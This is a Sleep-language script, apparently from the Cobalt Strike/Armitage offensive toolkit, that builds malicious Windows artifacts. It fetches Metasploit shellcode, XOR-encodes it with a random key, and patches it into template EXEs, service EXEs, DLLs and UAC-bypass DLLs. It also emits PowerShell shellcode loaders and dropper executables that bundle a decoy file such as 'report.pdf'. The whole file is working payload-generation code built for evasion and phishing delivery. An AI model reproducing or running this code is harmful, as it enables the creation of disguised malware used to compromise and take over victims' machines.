#
# generate artifacts plz.
#

# Generate Random Name (if needed)
#
sub randomArtifactName {
	local('$alpha $res $x');
	$alpha  = "abcdefghijklmnopqrstuvwxyz";
	$alpha .= uc($alpha);
	$alpha  = split("", $alpha);
	for ($x = 0; $x < (rand(6) + 2); $x++) {
		$res .= rand($alpha);
	}
	return "$res $+ .exe";
}

# Function to Request a Safe Payload (async! $4 is callback)
# 
sub generateSafePayload {
	local('$data $output $file $dropme $name $a $b $c $d');
	($a, $b, $c, $d) = @_;

	$output  = $c['output'];
	$file    = $a;
	$name    = $c['NAME'];
	$dropme  = $c['FILE'];

	# delete the old file... (if there is one)
	if (-exists $file && !-isDir $file) {
		deleteFile($file);
	}

	#
	# generate shellcode for the payload
	#
	$c["Format"]   = "raw";
	$c["EXITFUNC"] = "thread";
	$c["Encoder"]  = "generic/none";

	# clean up
	$c["output"]   = $null;
	
	call_async_callback($client, "module.execute", $this, "payload", $b, $c);
	yield;
	$data = convertAll($1)['payload'];

	# clean up continued
	$c["Format"]   = $null;
	$c["EXITFUNC"] = $null;
	$c["Encoder"]  = $null;

	#
	# give a Cortana script the opportunity to handle this request
	#
	if ($output eq "Windows EXE") {
		($null, $file) = filter_data("cobaltstrike_generate_exe32", $data, $file);
	}
	else if ($output eq "Windows Service EXE") {
		($null, $file) = filter_data("cobaltstrike_generate_svcexe32", $data, $file);
	}
	else if ($output eq "Windows DLL (32-bit)") {
		($null, $file) = filter_data("cobaltstrike_generate_dll32", $data, $file);
	}
	else if ($output eq "Windows DLL (64-bit)") {
		($null, $file) = filter_data("cobaltstrike_generate_dll64", $data, $file);
	}
	else if ($output eq "Windows UAC DLL (32-bit)") {
		($null, $file) = filter_data("cobaltstrike_generate_uacdll32", $data, $file);
	}
	else if ($output eq "Windows UAC DLL (64-bit)") {
		($null, $file) = filter_data("cobaltstrike_generate_uacdll64", $data, $file);
	}
	else if ($output eq "Windows Dropper EXE") {
		($null, $file) = filter_data("cobaltstrike_generate_dropper32", $data, $file, $dropme, $name);
	}

	if (-exists $file) {
		[$d: getFileProper($file)];
		return;
	}

	#
	# do it the built-in way.
	#
	if ($output eq "Windows EXE") {
		patchArtifact($data, "artifact32.exe", $file);
	}
	else if ($output eq "Windows Service EXE") {
		patchArtifact($data, "artifact32svc.exe", $file);
	}
	else if ($output eq "Windows DLL (32-bit)") {
		patchArtifact($data, "artifact32.dll", $file);
	}
	else if ($output eq "Windows DLL (64-bit)") {
		patchArtifact($data, "artifact64.dll", $file);
	}
	else if ($output eq "Windows UAC DLL (32-bit)") {
		patchArtifact($data, "artifactuac32.dll", $file);
	}
	else if ($output eq "Windows UAC DLL (64-bit)") {
		patchArtifact($data, "artifactuac64.dll", $file);
	}
	else if ($output eq "Windows Dropper EXE") {
		patchArtifact($data, "dropper32.exe", "$file $+ .tmp");
		setupDropper("$file $+ .tmp", $dropme, $name);
		rename("$file $+ .tmp", $file);
	}

	[$d: getFileProper($file)];
}

sub generateSafeStagedPayload {
	local('$file $data $output');
	($file, $data, $output) = @_;

	# delete the old file... (if there is one)
	if (-exists $file && !-isDir $file) {
		deleteFile($file);
	}

	#
	# give a Cortana script the opportunity to handle this request
	#
	if ($output eq "Windows EXE") {
		($null, $file) = filter_data("cobaltstrike_generate_big_exe32", $data, $file);
	}
	else if ($output eq "Windows Service EXE") {
		($null, $file) = filter_data("cobaltstrike_generate_big_svcexe32", $data, $file);
	}
	else if ($output eq "Windows DLL (32-bit)") {
		($null, $file) = filter_data("cobaltstrike_generate_big_dll32", $data, $file);
	}

	if (-exists $file) {
		return getFileProper($file);
	}

	#
	# do it the built-in way.
	#
	if ($output eq "Windows EXE") {
		patchArtifact($data, "artifact32big.exe", $file);
	}
	else if ($output eq "Windows Service EXE") {
		patchArtifact($data, "artifact32svcbig.exe", $file);
	}
	else if ($output eq "Windows DLL (32-bit)") {
		patchArtifact($data, "artifact32big.dll", $file);
	}
	else if ($output eq "Windows DLL (64-bit)") {
		patchArtifact($data, "artifact64big.dll", $file);
	}
	else if ($output eq "Raw") {
		local('$handle');
		$handle = openf("> $+ $file");
		writeb($handle, $data);
		closef($handle);
	}
	else if ($output eq "PowerShell") {
		local('$handle $template $output $bytes');

		# PowerShell Template
		$handle   = [SleepUtils getIOHandle: resource("resources/template.ps1"), $null];
		$template = readb($handle, -1);
		closef($handle);

		# Format our data.
		$data = split('', $data);
		shift($data);
		map({ $1 = "0x" . formatNumber(asc($1), 10, 16); }, $data);
		$output = join(", ", $data);

		# Write out our file.
		$handle = openf("> $+ $file");
		writeb($handle, strrep($template, '%%DATA%%', $output));
		closef($handle);
	}

	return getFileProper($file);
}

# patchArtifact("payload shellcode", "artifact to patch", "save to here")
sub patchArtifact {
	local('$handle $data $key $index $payload $buffer $b $x');

	$payload = $1;

	# read in the topaz executable
	$handle = [SleepUtils getIOHandle: resource("resources/ $+ $2"), $null];
	$data = readb($handle, -1);
	closef($handle);

	# generate a random key
	$key = @();
	$key[0] = int(rand() * 253) + 1;
	$key[1] = int(rand() * 253) + 1;
	$key[2] = int(rand() * 253) + 1;
	$key[3] = int(rand() * 253) + 1;

	# find the location of our data in the executable
	$index = indexOf($data, 'A' x 1024);

	# pack data into a buffer 
	$buffer = allocate(1024);

	# [offset of payload data in binary] - 4 bytes
	writeb($buffer, pack("i-", $index + 16));

	# [length of payload] - 4 bytes
	writeb($buffer, pack("i-", strlen($payload)));

	# [xor key] - 4 bytes
	writeb($buffer, chr($key[0]) );
	writeb($buffer, chr($key[1]) );
	writeb($buffer, chr($key[2]) );
	writeb($buffer, chr($key[3]) );

	# [padding] - 4 bytes
	writeb($buffer, 'aaaa');

	# pack our encoded payload into the buffer
	for ($x = 0; $x < strlen($payload); $x++) {
		writeb( $buffer, chr( (byteAt($payload, $x) ^ $key[$x % 4]) & 0xFF ) );
	}

	# retrieve the contents of the buffer.
	closef($buffer);
	$b = readb($buffer, -1);

	# generate a file
	$handle = openf("> $+ $3");
	writeb($handle, replaceAt($data, "$[1024]b", $index));
	closef($handle);
}

# setupDropper("file to append dropper data to", "file to include in dropper", "file's name")
sub setupDropper {
	local('$handle $dropme $data $blob $index');
	# '/root/activity_report_shmoo.pdf.tmp', '/root/activity_report_shmoo.pdf', 'report.pdf'

	# open the file to drop
	$handle = openf($2);
	$dropme = readb($handle, -1);
	closef($handle);

	# open the exe we will write to eventually
	$handle = openf($1);
	$data = readb($handle, -1);
	closef($handle);

	# pack some info that the dropper will use
				# length of dropped file name + NULL terminator
						# length of dropped data
	$blob = pack("i-i-", strlen($3) + 1, strlen($dropme));

	# locate our patch location...
	$index = indexOf($data, 'DROPPER!');

	# patch our exe with the info
	$data = replaceAt($data, $blob, $index);

	# write out our file please..
	$handle = openf("> $+ $1");
	writeb($handle, $data);		# exe data
	writeb($handle, "$3 $+ \x00");	# dropped file name
	writeb($handle, $dropme);	# dropped file
	closef($handle);
}
